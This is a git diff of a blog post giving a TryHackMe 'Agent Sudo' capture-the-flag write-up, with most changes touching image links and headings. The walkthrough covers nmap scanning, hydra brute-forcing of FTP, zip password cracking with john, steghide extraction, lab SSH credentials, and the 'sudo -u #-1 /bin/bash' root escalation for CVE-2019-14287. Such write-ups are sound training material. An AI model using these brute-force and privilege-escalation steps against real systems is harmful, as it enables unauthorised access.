@@ -1,7 +1,7 @@
 ---
 title: TryHackMe - Agent Sudo
 author: Bonface
-date: 2021-12-21 00:00:00 +0000
+date: 2024-10-31 00:00:00 +0000
 categories: [TryHackMe]
 tags: [tryhackme, linux, web, privesc, bruteforce, hydra, suid, john, crack, gobuster]
 ---
@@ -11,17 +11,16 @@ tags: [tryhackme, linux, web, privesc, bruteforce, hydra, suid, john, crack, gob
 You found a secret server located under the deep sea.  
 Your task is to hack inside the server and reveal the truth.
 
-#### Task 2: Enumerate
-### Task 3: Hash cracking and [brute-force](#bruteforce)
-
+### Task 2: Enumerate
+### Task 3: Hash cracking and brute-force
 ### Task 4: Capture the user flag  
 ### Task 5: Privilege escalation
+
 
 
 ## Enumerate
 ### nmap
 
-### ip = 10.10.55.182
 ```sh 
 nmap -sV -sC -v 10.10.224.246
 ```
@@ -71,24 +70,24 @@ Nothing much
 
 ### surf the web
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101306.png)
+![](/assets/img/Agent_sudo/1.png)
 
 Let's try spoofing as C and get the same URL with curl.  
 -A allows us to spoof the user agent and -L follows any redirects.
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101415.png)
+![](/assets/img/Agent_sudo/2.png)
 
 Now we have a user `chris` but not sure it's for ssh or ftp.
 
 ### ftp-21
 
-# bruteforce
+## bruteforce
 ```sh
 hydra -L users.txt -P passwords.txt <IP> ftp 
 # hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
 ```
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101444.png)
+![](/assets/img/Agent_sudo/3.png)
 
 ## Result
 ftp details  
@@ -99,11 +98,11 @@ log in!!!
 ftp chris@10.10.55.182 
 ```
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101527.png)
+![](/assets/img/Agent_sudo/4.png)
 
 
 we got the file, concatenate it:  
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101543.png)
+![](/assets/img/Agent_sudo/5.png)
 
 
 Will have to go back and get the images. We run binwalk on the png file which is the most likely to contain some hidden files.
@@ -122,7 +121,7 @@ zip2john 8702.zip > forjohn
 john forjohn.txt
 ```
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101614.png)
+![](/assets/img/Agent_sudo/6.png)
 
 Password = alien  
 Unzip the files. 
@@ -141,7 +140,7 @@ steghide extract -sf cute-alien.jpg
 cat message.txt
 ```
 
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241023204845.png)
+![](/assets/img/Agent_sudo/10.png)
 
 
 ### Details
@@ -155,11 +154,11 @@ Details
  ssh james@10.10.55.182 
 # password = hackerrules!
 ```
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101901.png)
+![](/assets/img/Agent_sudo/87.png)
 
-# Privilege escalation
+## Privilege escalation
 Run sudo -l  
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016101951.png)
+![](/assets/img/Agent_sudo/8.png)
 
 Google search for the exploit: CVE:2019-14287  
 In the exploit page, we get:  
@@ -167,4 +166,4 @@ In the exploit page, we get:
  'sudo -u #-1 /bin/bash'
  #Read the root flag. 
 ```
-![robots](/assets/img/Agent_sudo/Pasted%20image%2020241016102023.png)
+![](/assets/img/Agent_sudo/9.png)
